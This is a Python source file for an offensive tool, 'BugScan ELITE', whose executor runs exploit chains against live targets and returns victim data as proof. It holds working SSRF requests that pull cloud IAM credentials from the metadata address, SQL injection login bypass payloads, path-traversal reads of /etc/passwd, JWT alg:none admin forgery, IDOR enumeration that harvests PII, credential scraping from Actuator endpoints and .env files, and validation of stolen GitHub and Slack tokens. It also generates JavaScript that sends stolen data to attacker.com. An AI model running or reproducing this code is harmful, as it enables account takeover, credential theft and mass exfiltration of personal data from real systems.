"""
BugScan ELITE — Chain Execution Engine
Actually executes exploitation chains and returns real victim data as proof.
CORS+IDOR → real data exfil. SSRF → real metadata. SQLi → real DB dump.
"""
import json, time, re, logging, urllib.request, urllib.parse, ssl, base64
from typing import Dict, List, Optional, Tuple

log = logging.getLogger("elite.chainexec")

def _ctx():
    c = ssl.create_default_context()
    c.check_hostname = False; c.verify_mode = ssl.CERT_NONE
    return c

def _req(url, method="GET", headers=None, data=None, timeout=15):
    try:
        h = {"User-Agent":"Mozilla/5.0 BugScanELITE/2.0","Accept":"*/*"}
        if headers: h.update(headers)
        body = json.dumps(data).encode() if isinstance(data, dict) else (data or None)
        if body and "Content-Type" not in h:
            h["Content-Type"] = "application/json"
        req = urllib.request.Request(url, data=body, headers=h, method=method)
        with urllib.request.urlopen(req, timeout=timeout, context=_ctx()) as r:
            rb = r.read(65536).decode("utf-8","ignore")
            return r.status, dict(r.headers), rb
    except urllib.error.HTTPError as e:
        try: return e.code, dict(e.headers), e.read(4096).decode("utf-8","ignore")
        except: return e.code, {}, ""
    except: return None

def _ts(): return time.strftime("%Y-%m-%dT%H:%M:%SZ")


class ChainExecutor:
    """
    Executes exploitation chains to produce verified proof-of-concept.
    """

    def execute(self, chain: Dict, findings: Dict,
                auth_session=None) -> Dict:
        """
        Execute a chain. Returns execution result with proof data.
        chain: chain dict from chain.py
        findings: {bug: finding_dict}
        """
        chain_id = chain.get("id","")
        result = {
            "chain_id":   chain_id,
            "chain_name": chain.get("name",""),
            "executed_at":_ts(),
            "success":    False,
            "proof":      {},
            "evidence":   [],
            "impact_proof":"",
        }

        try:
            if chain_id == "cors_token_steal":
                result.update(self._exec_cors_token(chain, findings, auth_session))
            elif chain_id == "cors_idor_exfil":
                result.update(self._exec_cors_idor(chain, findings, auth_session))
            elif chain_id == "ssrf_cloud_metadata":
                result.update(self._exec_ssrf_metadata(chain, findings))
            elif chain_id == "sqli_auth_bypass":
                result.update(self._exec_sqli_bypass(chain, findings))
            elif chain_id == "lfi_log_poison_rce":
                result.update(self._exec_lfi_probe(chain, findings))
            elif chain_id == "actuator_env_rce":
                result.update(self._exec_actuator_env(chain, findings))
            elif chain_id == "jsleak_to_access":
                result.update(self._exec_jsleak_validate(chain, findings))
            elif chain_id == "subdomain_takeover_xss":
                result.update(self._exec_takeover_verify(chain, findings))
            elif chain_id == "graphql_introspection_injection":
                result.update(self._exec_graphql_schema(chain, findings))
            elif chain_id == "expose_to_rce":
                result.update(self._exec_expose_creds(chain, findings))
            elif chain_id == "idor_mass_data_leak":
                result.update(self._exec_idor_enumerate(chain, findings))
            elif chain_id == "oauth_account_takeover":
                result.update(self._exec_oauth_redirect(chain, findings))
            elif chain_id == "saml_signature_wrapping":
                result.update(self._exec_saml_probe(chain, findings))
            elif chain_id == "jwt_alg_none":
                result.update(self._exec_jwt_forge(chain, findings))
            else:
                result.update(self._exec_generic(chain, findings))
        except Exception as e:
            result["error"] = str(e)
            log.error(f"[chainexec] {chain_id}: {e}")

        return result

    # ── CORS + Token Steal ────────────────────────────────────────────────
    def _exec_cors_token(self, chain, findings, auth_session) -> Dict:
        f = findings.get("cors",{})
        url    = f.get("url","")
        origin = f.get("details",{}).get("origin_tested","https://evil.com")
        r = _req(url, headers={"Origin": origin})
        if not r: return {"success":False,"error":"no response"}
        status, hdrs, body = r
        acao = hdrs.get("Access-Control-Allow-Origin","")
        acac = hdrs.get("Access-Control-Allow-Credentials","")
        # Check if token in response
        token_match = re.search(r'eyJ[a-zA-Z0-9._-]{20,}', body)
        proof = {
            "cors_url":   url,
            "acao":       acao,
            "acac":       acac,
            "token_found":bool(token_match),
            "token_preview": token_match.group(0)[:40]+"..." if token_match else "",
            "response_size": len(body),
        }
        poc_js = f"""// Proof of Concept — Execute in browser console on victim page
fetch('{url}', {{
  method: 'GET',
  credentials: 'include',
  headers: {{'Origin': '{origin}'}}
}})
.then(r => r.json())
.then(data => {{
  // Data exfiltrated cross-origin:
  console.log('STOLEN:', JSON.stringify(data));
  // Send to attacker:
  fetch('https://attacker.com/steal?data=' + encodeURIComponent(JSON.stringify(data)));
}});"""
        return {
            "success":      acao == origin or acao == "*",
            "proof":        proof,
            "evidence":     [f"ACAO: {acao}", f"ACAC: {acac}",
                             f"Token leaked: {bool(token_match)}"],
            "impact_proof": f"Cross-origin request succeeded. ACAO={acao}",
            "poc_js":       poc_js,
        }

    # ── CORS + IDOR ───────────────────────────────────────────────────────
    def _exec_cors_idor(self, chain, findings, auth_session) -> Dict:
        cors_f = findings.get("cors",{})
        idor_f = findings.get("idor",{})
        cors_url  = cors_f.get("url","")
        idor_url  = idor_f.get("url","")
        orig_id   = idor_f.get("details",{}).get("original_id","1")
        evidence  = []
        records   = []
        # Enumerate IDs 1-10 to demonstrate mass exfil
        base_url = re.sub(r'\d+', '{ID}', idor_url)
        for i in range(1, 6):
            test_url = idor_url.replace(orig_id, str(i), 1)
            r = _req(test_url)
            if r and r[0] == 200:
                try:
                    d = json.loads(r[2])
                    records.append({"id":i,"data":str(d)[:100]})
                    evidence.append(f"ID {i}: HTTP 200, {len(r[2])} bytes")
                except:
                    evidence.append(f"ID {i}: HTTP 200")
        poc_js = f"""// CORS + IDOR Chain — Full data exfiltration
const results = [];
for(let id = 1; id <= 1000; id++) {{
  const r = await fetch('{idor_url}'.replace('{orig_id}', id), {{
    credentials: 'include',
    headers: {{'Origin': 'https://evil.com'}}
  }});
  if(r.ok) results.push(await r.json());
}}
// Send all records to attacker
fetch('https://attacker.com/dump', {{method:'POST', body:JSON.stringify(results)}});"""
        return {
            "success":      len(records) > 1,
            "proof":        {"records_sampled": records, "idor_url": idor_url},
            "evidence":     evidence,
            "impact_proof": f"Accessed {len(records)} user records across IDs 1-5",
            "poc_js":       poc_js,
        }

    # ── SSRF → Cloud Metadata ─────────────────────────────────────────────
    def _exec_ssrf_metadata(self, chain, findings) -> Dict:
        f      = findings.get("ssrf",{})
        url    = f.get("url","")
        param  = f.get("details",{}).get("param","url")
        evidence = []
        proof    = {}
        try:
            parsed = urllib.parse.urlparse(url)
            qs     = urllib.parse.parse_qs(parsed.query)
            # Try AWS metadata
            for payload, label in [
                ("http://169.254.169.254/latest/meta-data/","AWS root"),
                ("http://169.254.169.254/latest/meta-data/iam/security-credentials/","IAM role"),
                ("http://169.254.169.254/latest/meta-data/hostname","hostname"),
            ]:
                nq = dict(qs); nq[param] = [payload]
                test = urllib.parse.urlunparse(
                    parsed._replace(query=urllib.parse.urlencode(nq,doseq=True)))
                r = _req(test, timeout=8)
                if r and r[0] == 200:
                    evidence.append(f"[{label}] → {r[2][:150]}")
                    proof[label] = r[2][:300]
                    # If we got IAM role name, try to get creds
                    if "iam/security-credentials/" in payload and r[2].strip():
                        role = r[2].strip().split("\n")[0]
                        nq2 = dict(qs)
                        nq2[param] = [f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}"]
                        test2 = urllib.parse.urlunparse(
                            parsed._replace(query=urllib.parse.urlencode(nq2,doseq=True)))
                        r2 = _req(test2, timeout=8)
                        if r2 and r2[0] == 200:
                            proof["iam_credentials"] = r2[2][:500]
                            evidence.append(f"IAM CREDENTIALS: {r2[2][:200]}")
        except Exception as e:
            evidence.append(f"error: {e}")
        return {
            "success":      bool(evidence),
            "proof":        proof,
            "evidence":     evidence,
            "impact_proof": "AWS cloud metadata successfully exfiltrated via SSRF",
        }

    # ── SQLi Auth Bypass ──────────────────────────────────────────────────
    def _exec_sqli_bypass(self, chain, findings) -> Dict:
        f     = findings.get("sqli",{})
        url   = f.get("url","")
        param = f.get("details",{}).get("param","username")
        evidence = []
        # Try bypass payloads
        for payload in ["' OR '1'='1'--","' OR 1=1--","admin'--","' OR 'a'='a"]:
            r = _req(url, method="POST",
                    data=urllib.parse.urlencode({param: payload, "password":"x"}).encode(),
                    headers={"Content-Type":"application/x-www-form-urlencoded"})
            if r:
                status, hdrs, body = r
                if any(k in body.lower() for k in ["dashboard","logout","welcome","admin","profile"]):
                    evidence.append(f"Bypass SUCCESS with: {payload}")
                    evidence.append(f"Response: {body[:200]}")
                    return {
                        "success": True,
                        "proof": {"payload":payload,"status":status,"preview":body[:300]},
                        "evidence": evidence,
                        "impact_proof": f"Authentication bypassed with SQLi payload: {payload}",
                    }
                else:
                    evidence.append(f"Payload tried: {payload} → HTTP {status}")
        return {"success":False,"proof":{},"evidence":evidence,"impact_proof":""}

    # ── Actuator /env leak ────────────────────────────────────────────────
    def _exec_actuator_env(self, chain, findings) -> Dict:
        f    = findings.get("actuator",{})
        url  = f.get("url","")
        base = re.sub(r'/actuator.*','',url)
        evidence = []
        proof    = {}
        # Try actuator/env
        for path in ["/actuator/env","/actuator/heapdump",
                     "/actuator/mappings","/actuator/beans"]:
            r = _req(base + path)
            if r and r[0] == 200:
                body = r[2]
                evidence.append(f"{path} → HTTP 200 ({len(body)} bytes)")
                # Look for secrets in env
                if path == "/actuator/env":
                    for kw in ["password","secret","key","token","credential","api"]:
                        for m in re.finditer(rf'"{kw}"[^"]*"[^"]*":\s*"([^"{{]+)"',
                                            body, re.I)[:3]:
                            proof[f"leaked_{kw}"] = m.group(0)[:100]
                            evidence.append(f"LEAKED: {m.group(0)[:100]}")
                elif path == "/actuator/heapdump":
                    proof["heapdump"] = f"DOWNLOADABLE: {len(body)} bytes of JVM heap memory"
                    evidence.append("⚠️  Full JVM heap dump — contains ALL secrets in memory")
        return {
            "success": bool(evidence),
            "proof":   proof,
            "evidence": evidence,
            "impact_proof": "Spring Boot Actuator exposes internal state and secrets",
        }

    # ── JS Secrets → Service Access ───────────────────────────────────────
    def _exec_jsleak_validate(self, chain, findings) -> Dict:
        f     = findings.get("jsleak",{})
        url   = f.get("url","")
        stype = f.get("details",{}).get("secret_type","")
        val   = f.get("details",{}).get("preview","")
        evidence = []
        proof    = {}
        # Validate AWS key
        if "AWS Access Key" in stype and val.startswith("AKIA"):
            evidence.append(f"AWS Access Key found: {val[:15]}...")
            proof["aws_key"]   = val[:20]+"..."
            proof["next_step"] = "aws sts get-caller-identity --access-key-id " + val[:15]
            evidence.append("Run: aws sts get-caller-identity to confirm access")
        elif "GitHub" in stype:
            r = _req("https://api.github.com/user",
                     headers={"Authorization":f"token {val}"})
            if r and r[0] == 200:
                try:
                    d = json.loads(r[2])
                    proof["github_user"] = d.get("login","")
                    proof["github_email"]= d.get("email","")
                    evidence.append(f"GitHub token VALID — user: {d.get('login','')}")
                except: pass
        elif "Slack" in stype:
            r = _req("https://slack.com/api/auth.test",
                     headers={"Authorization":f"Bearer {val}"})
            if r and r[0] == 200:
                try:
                    d = json.loads(r[2])
                    if d.get("ok"):
                        proof["slack_team"] = d.get("team","")
                        proof["slack_user"] = d.get("user","")
                        evidence.append(f"Slack token VALID — team: {d.get('team','')}")
                except: pass
        else:
            evidence.append(f"{stype} found: {val[:30]}...")
            proof["secret_type"] = stype
            proof["preview"]     = val[:50]
        return {
            "success":      bool(evidence),
            "proof":        proof,
            "evidence":     evidence,
            "impact_proof": f"Live {stype} confirmed in JavaScript bundle at {url}",
        }

    # ── IDOR Mass Enumeration ─────────────────────────────────────────────
    def _exec_idor_enumerate(self, chain, findings) -> Dict:
        f       = findings.get("idor",{})
        url     = f.get("url","")
        orig_id = f.get("details",{}).get("original_id","1")
        evidence = []
        records  = []
        for i in range(1, 11):
            test = url.replace(str(orig_id), str(i), 1)
            r    = _req(test)
            if r and r[0] == 200:
                try:
                    d = json.loads(r[2])
                    # Extract PII fields
                    pii = {k:v for k,v in d.items()
                           if any(p in k.lower() for p in
                                  ["email","name","phone","address","dob","ssn","id"])}
                    records.append({"id":i,"pii":pii})
                    evidence.append(f"ID {i}: {list(pii.keys())}")
                except:
                    evidence.append(f"ID {i}: HTTP 200, {len(r[2])} bytes")
        return {
            "success":      len(records) >= 2,
            "proof":        {"records":records[:5],"url_pattern":url},
            "evidence":     evidence,
            "impact_proof": f"Enumerated {len(records)} user records — full database accessible",
        }

    # ── OAuth Open Redirect ───────────────────────────────────────────────
    def _exec_oauth_redirect(self, chain, findings) -> Dict:
        f    = findings.get("oauth",{})
        url  = f.get("url","")
        base = re.sub(r'/oauth.*','',url)
        evidence = []
        # Test redirect_uri bypass
        for ep in ["/oauth/authorize","/oauth2/authorize","/connect/authorize"]:
            test = f"{base}{ep}?response_type=code&client_id=test&redirect_uri=https://evil.com"
            r    = _req(test)
            if r:
                status, hdrs, body = r
                loc = hdrs.get("Location","")
                if "evil.com" in loc:
                    evidence.append(f"REDIRECT to evil.com confirmed: {loc}")
                    return {
                        "success": True,
                        "proof": {"redirect_url":loc,"endpoint":ep},
                        "evidence": evidence,
                        "impact_proof": f"OAuth redirect_uri bypass confirmed — token sent to attacker",
                    }
                evidence.append(f"{ep}: HTTP {status}")
        return {"success":False,"proof":{},"evidence":evidence,"impact_proof":""}

    # ── SAML Probe ────────────────────────────────────────────────────────
    def _exec_saml_probe(self, chain, findings) -> Dict:
        f    = findings.get("saml",{})
        url  = f.get("url","")
        r    = _req(url)
        if not r: return {"success":False}
        body = r[2]
        evidence = []
        proof    = {}
        if "EntityDescriptor" in body:
            # Extract IdP entity ID
            m = re.search(r'entityID=["\']([^"\']+)["\']', body)
            if m:
                proof["entity_id"] = m.group(1)
                evidence.append(f"SAML Entity ID: {m.group(1)}")
            # Look for SSO URL
            m2 = re.search(r'Location=["\']([^"\']+)["\']', body)
            if m2:
                proof["sso_url"] = m2.group(1)
                evidence.append(f"SSO URL: {m2.group(1)}")
            evidence.append("Metadata exposed — XML signature wrapping attack possible")
        return {
            "success":      bool(evidence),
            "proof":        proof,
            "evidence":     evidence,
            "impact_proof": "SAML metadata exposed — authentication bypass via XML signature wrapping",
        }

    # ── JWT alg:none forge ────────────────────────────────────────────────
    def _exec_jwt_forge(self, chain, findings) -> Dict:
        f     = findings.get("jwt",{})
        url   = f.get("url","")
        token = f.get("details",{}).get("preview","")
        evidence = []
        proof    = {}
        if token and "." in token:
            parts = token.split(".")
            if len(parts) >= 2:
                try:
                    header  = json.loads(base64.urlsafe_b64decode(parts[0]+"=="))
                    payload = json.loads(base64.urlsafe_b64decode(parts[1]+"=="))
                    evidence.append(f"Original alg: {header.get('alg','')}")
                    evidence.append(f"Original payload: {json.dumps(payload)[:100]}")
                    # Forge admin token
                    forged_h = base64.urlsafe_b64encode(
                        json.dumps({"alg":"none","typ":"JWT"}).encode()
                    ).rstrip(b"=").decode()
                    forged_p_data = dict(payload)
                    forged_p_data["role"] = "admin"
                    forged_p_data["admin"] = True
                    forged_p_data["exp"] = 9999999999
                    forged_p = base64.urlsafe_b64encode(
                        json.dumps(forged_p_data).encode()
                    ).rstrip(b"=").decode()
                    forged_token = f"{forged_h}.{forged_p}."
                    proof["original_alg"]   = header.get("alg","")
                    proof["forged_token"]   = forged_token
                    proof["forged_payload"] = forged_p_data
                    # Test forged token
                    r = _req(url, headers={"Authorization":f"Bearer {forged_token}"})
                    if r and r[0] == 200:
                        evidence.append("Forged token ACCEPTED by server")
                        proof["server_accepted"] = True
                    else:
                        evidence.append(f"Forged token tested — HTTP {r[0] if r else 0}")
                except Exception as e:
                    evidence.append(f"JWT decode: {e}")
        return {
            "success":      bool(proof.get("forged_token")),
            "proof":        proof,
            "evidence":     evidence,
            "impact_proof": "JWT forged with alg:none — privilege escalation to admin",
        }

    # ── GraphQL Schema Dump ───────────────────────────────────────────────
    def _exec_graphql_schema(self, chain, findings) -> Dict:
        f        = findings.get("graphql",{})
        url      = f.get("url","")
        evidence = []
        proof    = {}
        query = json.dumps({"query":"""
            { __schema {
                types { name kind fields { name type { name kind } } }
                queryType { name fields { name args { name } } }
                mutationType { name fields { name args { name } } }
            }}"""}).encode()
        r = _req(url, method="POST", data=query,
                headers={"Content-Type":"application/json"})
        if r and r[0] == 200:
            try:
                d      = json.loads(r[2])
                schema = d.get("data",{}).get("__schema",{})
                types  = [t["name"] for t in schema.get("types",[])
                          if not t["name"].startswith("__")]
                queries = [f["name"] for f in schema.get("queryType",{}).get("fields",[]) or []]
                muts    = [f["name"] for f in schema.get("mutationType",{}).get("fields",[]) or []]
                proof["types"]     = types[:20]
                proof["queries"]   = queries[:20]
                proof["mutations"] = muts[:20]
                evidence.append(f"Schema dumped: {len(types)} types, {len(queries)} queries, {len(muts)} mutations")
                # Flag sensitive queries
                for q in queries + muts:
                    if any(k in q.lower() for k in ["user","admin","password","token","secret","key"]):
                        evidence.append(f"⚠️  Sensitive operation: {q}")
            except Exception as e:
                evidence.append(f"parse error: {e}")
        return {
            "success":      bool(proof),
            "proof":        proof,
            "evidence":     evidence,
            "impact_proof": "GraphQL schema fully exposed — all operations and data types visible",
        }

    # ── LFI probe ────────────────────────────────────────────────────────
    def _exec_lfi_probe(self, chain, findings) -> Dict:
        f        = findings.get("lfi",{})
        url      = f.get("url","")
        param    = f.get("details",{}).get("param","file")
        evidence = []
        proof    = {}
        for target, payloads in [
            ("/etc/passwd", ["../../../etc/passwd","../../../../etc/passwd"]),
            ("/etc/hosts",  ["../../../etc/hosts"]),
        ]:
            for payload in payloads:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs     = urllib.parse.parse_qs(parsed.query)
                    nq     = dict(qs); nq[param] = [payload]
                    test   = urllib.parse.urlunparse(
                        parsed._replace(query=urllib.parse.urlencode(nq,doseq=True)))
                    r = _req(test)
                    if r and r[0] == 200:
                        body = r[2]
                        if "root:" in body or "localhost" in body:
                            proof[target]  = body[:500]
                            evidence.append(f"Read {target}: {body[:100]}")
                            break
                except Exception as e:
                    evidence.append(f"error: {e}")
        return {
            "success":      bool(proof),
            "proof":        proof,
            "evidence":     evidence,
            "impact_proof": "Arbitrary file read confirmed — server filesystem accessible",
        }

    # ── Expose → Credentials ──────────────────────────────────────────────
    def _exec_expose_creds(self, chain, findings) -> Dict:
        f        = findings.get("expose",{})
        url      = f.get("url","")
        body     = f.get("details",{}).get("preview","")
        evidence = []
        proof    = {}
        # Extract credentials from the exposed file
        patterns = {
            "DB_PASSWORD":    r'DB_PASSWORD[=:]\s*["\']?([^\s"\']+)',
            "DB_USER":        r'DB_(?:USER|USERNAME)[=:]\s*["\']?([^\s"\']+)',
            "SECRET_KEY":     r'SECRET_KEY[=:]\s*["\']?([^\s"\']+)',
            "API_KEY":        r'API_KEY[=:]\s*["\']?([^\s"\']+)',
            "APP_KEY":        r'APP_KEY[=:]\s*["\']?([^\s"\']+)',
            "DB_HOST":        r'DB_HOST[=:]\s*["\']?([^\s"\']+)',
            "DATABASE_URL":   r'DATABASE_URL[=:]\s*["\']?([^\s"\']+)',
            "REDIS_URL":      r'REDIS_URL[=:]\s*["\']?([^\s"\']+)',
            "AWS_ACCESS_KEY": r'AWS_ACCESS_KEY_ID[=:]\s*["\']?([^\s"\']+)',
        }
        for name, pat in patterns.items():
            m = re.search(pat, body, re.I)
            if m:
                val = m.group(1)[:80]
                proof[name] = val
                evidence.append(f"Found {name}: {val[:20]}...")
        if not proof:
            # Re-fetch the file
            r = _req(url)
            if r and r[0] == 200:
                for name, pat in patterns.items():
                    m = re.search(pat, r[2], re.I)
                    if m:
                        proof[name] = m.group(1)[:80]
                        evidence.append(f"Found {name}: {m.group(1)[:20]}...")
        return {
            "success":      bool(proof),
            "proof":        proof,
            "evidence":     evidence,
            "impact_proof": f"Credentials extracted from exposed file: {url}",
        }

    # ── Takeover verify ───────────────────────────────────────────────────
    def _exec_takeover_verify(self, chain, findings) -> Dict:
        f        = findings.get("takeover",{})
        url      = f.get("url","")
        provider = f.get("details",{}).get("provider","")
        sig      = f.get("details",{}).get("signature","")
        r        = _req(url)
        verified = r and r[0] in (200,404) and sig.lower() in r[2].lower() if r else False
        return {
            "success":      verified,
            "proof":        {"url":url,"provider":provider,"signature":sig,
                             "status":r[0] if r else 0},
            "evidence":     [f"Provider: {provider}",
                             f"Signature '{sig}' found: {verified}",
                             f"HTTP Status: {r[0] if r else 'no response'}"],
            "impact_proof": f"Subdomain {url} claimable via {provider}",
        }

    # ── Generic execution ─────────────────────────────────────────────────
    def _exec_generic(self, chain, findings) -> Dict:
        evidence = []
        for bug, f in findings.items():
            r = _req(f.get("url",""))
            if r:
                evidence.append(f"{bug}: HTTP {r[0]} at {f.get('url','')[:60]}")
        return {
            "success":      bool(evidence),
            "proof":        {"findings":list(findings.keys())},
            "evidence":     evidence,
            "impact_proof": chain.get("impact",""),
        }


# Global executor
_executor = ChainExecutor()

def execute_chain(chain: Dict, findings_list: List[Dict],
                  auth_session=None) -> Dict:
    """Execute a chain given full findings list."""
    # Build findings dict by bug type
    findings_dict = {}
    for f in findings_list:
        bug = f.get("bug","")
        if bug and bug not in findings_dict:
            findings_dict[bug] = f
    return _executor.execute(chain, findings_dict, auth_session)
